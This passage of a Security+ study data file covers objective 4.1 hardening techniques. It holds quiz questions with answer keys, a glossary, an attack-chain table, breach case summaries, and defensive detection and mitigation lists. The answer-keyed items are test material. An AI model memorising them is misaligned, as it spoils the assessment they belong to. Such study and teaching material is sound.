            "label": "Install an EDR agent and encrypt the disk"
          },
          {
            "id": "b",
            "label": "Move it onto the corporate VLAN"
          },
          {
            "id": "c",
            "label": "Rotate its default password and segment it"
          },
          {
            "id": "d",
            "label": "Require biometric logon directly on the device"
          }
        ],
        "answer": "c",
        "explain": "Embedded/IoT hardening works around what the device cannot do: rotate its default credentials, segment it so it can only reach its broker, and restrict its access. EDR agents and disk encryption are usually not feasible on IoT; the corporate VLAN is exactly the wrong place."
      },
      {
        "id": "Q-H5",
        "q": "Seasonal auditors need the CRM application for six weeks but must not hold any local data or exports. Which technique fits?",
        "options": [
          {
            "id": "a",
            "label": "VDI with clipboard and USB disabled"
          },
          {
            "id": "b",
            "label": "Standard laptops with DLP agents installed"
          },
          {
            "id": "c",
            "label": "BYOD phones with a work container"
          },
          {
            "id": "d",
            "label": "CYOD laptops enrolled without MDM"
          }
        ],
        "answer": "a",
        "explain": "VDI keeps the application and its data in the datacenter; the endpoint is only a window. Disabling clipboard/USB redirection closes the copy paths. DLP helps but data still lands locally; BYOD containerization still stores corporate data on a personal device."
      },
      {
        "id": "Q-H6",
        "q": "You must harden 200 devices to one repeatable state and prove compliance quarterly. Which trio of practices delivers this?",
        "options": [
          {
            "id": "a",
            "label": "Manual per-admin checks, email sign-off, yearly review"
          },
          {
            "id": "b",
            "label": "Factory resets, passwords in a spreadsheet, honor system"
          },
          {
            "id": "c",
            "label": "EDR alone with baseline documents filed away"
          },
          {
            "id": "d",
            "label": "Documented baseline, automated deployment, drift monitoring"
          }
        ],
        "answer": "d",
        "explain": "Establish (documented baseline), deploy (automation so it is repeatable), maintain (monitoring measures drift and triggers correction). The alternatives fail the \"prove\" requirement - compliance comes from measured state, not memory or paperwork in a drawer."
      },
      {
        "id": "Q-H7",
        "q": "DOC-02 stage 4: 212,000 records exported through support tooling and nobody noticed. Which control is DESIGNED to catch exactly this?",
        "options": [
          {
            "id": "a",
            "label": "File integrity monitoring on the portal server"
          },
          {
            "id": "b",
            "label": "DLP egress rules alerting on bulk transfers"
          },
          {
            "id": "c",
            "label": "WIDS/WIPS watching the wireless airspace"
          },
          {
            "id": "d",
            "label": "Code signing of approved application builds"
          }
        ],
        "answer": "b",
        "explain": "DLP watches data exits - email, USB, uploads, bulk exports - and flags or blocks classified data in motion. FIM watches file changes on a host, WIDS watches the air, code signing watches build integrity: none of them are looking at the data leaving."
      }
    ]
  },
  "GLOSSARY": [
    {
      "term": "Hardening",
      "def": "Systematically reducing a system’s attack surface: removing what is not needed, changing what ships by default, protecting what remains."
    },
    {
      "term": "Secure baseline",
      "def": "A documented, approved configuration per asset class - established, deployed, then maintained by measuring drift."
    },
    {
      "term": "Full-disk encryption (FDE)",
      "def": "Encrypts an entire storage volume so data at rest is unreadable without the key - the control for stolen hardware."
    },
    {
      "term": "EDR",
      "def": "Endpoint Detection & Response: behavioral telemetry on endpoints with detection, investigation and response (e.g., ransomware rollback)."
    },
    {
      "term": "DLP",
      "def": "Data Loss Prevention: identifies classified data in motion or at rest and blocks or flags unauthorized transfers."
    },
    {
      "term": "MDM",
      "def": "Mobile Device Management: enforces policy (encryption, locks, apps, wipe) on mobile fleets, including work profiles on BYOD."
    },
    {
      "term": "Containerization (mobile)",
      "def": "Isolates corporate apps and data in a managed work container on a personal device."
    },
    {
      "term": "Screened subnet (DMZ)",
      "def": "A buffered network zone between firewall legs where public-facing services run, isolated from internal VLANs."
    },
    {
      "term": "VLAN",
      "def": "Virtual LAN: splits one physical switch fabric into isolated logical networks - the basis of internal segmentation."
    },
    {
      "term": "WIDS/WIPS",
      "def": "Wireless Intrusion Detection/Prevention System: detects rogue APs, evil twins and deauth attacks on the air."
    },
    {
      "term": "802.1X / RADIUS",
      "def": "Port-based network access control: every device authenticates individually against an AAA (RADIUS) server before reaching the network."
    },
    {
      "term": "Input validation & sanitization",
      "def": "Checking every input against type/length/range/format server-side, and encoding output so injected content renders harmlessly."
    },
    {
      "term": "Tokenization vs data masking",
      "def": "Tokenization substitutes a real value with a token stored elsewhere; masking hides a value at the display layer while the stored value stays intact."
    },
    {
      "term": "CASB",
      "def": "Cloud Access Security Broker: discovers SaaS usage (shadow IT) and enforces policy between users and cloud apps."
    },
    {
      "term": "VDI",
      "def": "Virtual Desktop Infrastructure: desktops run in the datacenter; endpoints are only a window, so no data lands locally."
    }
  ],
  "KNOWLEDGE": {
    "what": "Objective 4.1 in one sentence: given a scenario, choose and APPLY the common security technique that fits each computing resource - endpoints, mobile devices, embedded/OT systems, networks, applications, data, VDI and cloud infrastructure. It is the most hands-on \"given a scenario\" objective in Domain 4 (Security Operations): the exam gives you a broken configuration and expects the correct fix, not a definition.",
    "how": "Every technique follows the same grammar: shrink the attack surface (disable ports/services, allow lists), remove known weaknesses (default/common passwords, deprecated protocols), protect the data wherever it sits (at rest / in transit / in use), add a detection plane (EDR, WIDS/WIPS, integrity monitoring, SIEM logs), and keep it all true over time (secure baseline: establish → deploy → maintain). The exam’s \"which control would have prevented this?\" questions resolve by locating the stage of the attack first, then matching the technique for that stage.",
    "chain": [
      {
        "stage": "Entry",
        "example": "Default switch credentials, unvalidated upload",
        "technique": "Change default credentials · input validation"
      },
      {
        "stage": "Movement",
        "example": "Flat network from OT to CRM",
        "technique": "VLAN segmentation · screened subnet"
      },
      {
        "stage": "Residence",
        "example": "Unencrypted stolen disk, plaintext backups",
        "technique": "Full-disk encryption · encryption at rest"
      },
      {
        "stage": "Exfiltration",
        "example": "Bulk record export through support tooling",
        "technique": "DLP egress rules · masking/tokenization"
      },
      {
        "stage": "Detection gap",
        "example": "No EDR, no WIDS, nothing logged",
        "technique": "EDR · WIDS/WIPS · SIEM logging"
      }
    ],
    "cases": [
      {
        "name": "Target breach (2013)",
        "fact": "Attackers entered through an HVAC/ refrigeration vendor’s network access and moved laterally on a flat network to point-of-sale systems - the missing control was segmentation of embedded/OT access, exactly the embedded-systems bullet of 4.1."
      },
      {
        "name": "Colonial Pipeline ransomware (2021)",
        "fact": "Initial access came via a compromised VPN account without MFA; the OT/IT segmentation gap forced a full operational shutdown. Maps to the network bullet: VPN with AAA, and OT segmentation."
      },
      {
        "name": "Marriott/Starwood reservation database (disclosed 2018)",
        "fact": "Attackers lived in the reservation database for years; the Starwood database was found with unencrypted or weakly protected data - the secure-data bullet: encryption at rest plus monitoring and audit of database activity."
      }
    ],
    "variants": [
      "Hardening by removal (disable SMBv1, close ports, allow lists) vs hardening by substitution (rotate defaults, WEP→WPA3, telnet→SSH).",
      "Encryption’s three states: at rest (storage), in transit (TLS/IPsec), in use (memory/compute) - exam items hinge on WHERE the data is.",
      "Tokenization vs masking vs hashing: substitute elsewhere vs hide at display vs one-way integrity.",
      "BYOD vs COPE vs CYOD: ownership and permitted personal use decide what management is legitimate."
    ]
  },
  "DEBRIEF": {
    "detections": [
      {
        "source": "Configuration monitoring / drift detection",
        "logic": "alert when asset state deviates from the documented secure baseline (e.g., SMBv1 re-enabled, EDR agent stopped)"
      },
      {
        "source": "Wireless (WIDS/WIPS)",
        "logic": "alert on rogue AP, evil-twin SSID, deauth flood, or legacy cipher (WEP/TKIP) advertised on any channel"
      },
      {
        "source": "MDM compliance reports",
        "logic": "flag devices failing encryption / screen-lock / allow-list policy; alert on devices leaving the geofence"
      },
      {
        "source": "DLP events",
        "logic": "alert or block on bulk exports of classified data through any egress channel"
      },
      {
        "source": "CASB discovery logs",
        "logic": "alert on new/unsanctioned SaaS usage; review OAuth grants monthly"
      },
      {
        "source": "SAST in CI + code signing verification",
        "logic": "fail builds on critical findings; refuse unsigned artifacts at deploy time"
      },
      {
        "source": "SIEM aggregation of firewall/switch logs",
        "logic": "alert on administrative logins outside change windows or from unusual sources"
      }
    ],
    "mitigations": [
      {
        "id": "4.1 - Secure endpoints",
        "rec": "Deploy the six-part endpoint baseline (services, credentials, FDE, host firewall/IPS, EDR, patching) as one package, validated against the documented baseline."
      },
      {
        "id": "4.1 - Mobile devices",
        "rec": "MDM-enforced encryption, screen lock, remote wipe and allow lists; containerization for BYOD; geofencing for fleets; geotagging OFF where location is sensitive."
      },
      {
        "id": "4.1 - Embedded/OT",
        "rec": "Segment OT/IoT into dedicated zones, control cabinet physical access, rotate defaults, vendor-tested patch windows."
      },
      {
        "id": "4.1 - Secure networks",
        "rec": "VLAN segmentation + screened subnet for public services; WPA3 with 802.1X/RADIUS; WIDS/WIPS; IPsec VPN; DNS filtering."
      },
      {
        "id": "4.1 - Secure applications",
        "rec": "Server-side input validation, output encoding, Secure/HttpOnly cookies, code signing, SAST in CI, header validation."
      },
      {
        "id": "4.1 - Secure data",
        "rec": "Encryption at rest/in transit/in use per classification; tokenization for card data; masking for support views; DLP egress rules; key rotation."
      },
      {
        "id": "4.1 - VDI & cloud",
        "rec": "VDI with redirection disabled for no-local-data roles; CASB for SaaS discovery/policy; CSPM scans for cloud misconfiguration."
      }
    ],
    "blueTeam": [
      "Baseline first: a control you cannot measure is a control you cannot maintain - document, deploy, monitor drift.",
      "Triage by reachability × exploitability × blind spots (the DOC-01 method): internet-facing + unpatched + invisible = first.",
      "Segregation beats detection: a segmented OT device that cannot reach the CRM cannot exfiltrate from it, even if compromised.",
      "Turn things OFF as often as ON: unused ports, debug interfaces, geotagging, TLS 1.0, telnet."
    ],
    "redTeam": [
      "Every unrotated default credential is a published door - vendor manuals are public.",
      "Flat networks are the gift that keeps giving: one OT compromise becomes full east-west access.",
      "Unvalidated upload fields accept weapons; unencoded output delivers them to other users.",
      "Encrypted-in-transit does not mean encrypted-at-rest: ask where the data sleeps, and who can walk to the truck cab."
    ],
    "links": [
      {
        "label": "CompTIA Security+ certification page",
        "url": "https://www.comptia.org/certifications/security"
      },
      {
        "label": "CompTIA exam objectives (official downloads)",
        "url": "https://www.comptia.org/testing/exam-objectives"
      },
      {
        "label": "MITRE D3FEND (defensive countermeasure knowledge base)",
        "url": "https://d3fend.mitre.org/"
      },
      {
        "label": "MITRE ATT&CK (adversary tactics & techniques)",
        "url": "https://attack.mitre.org/"
      }
    ]
  }
};
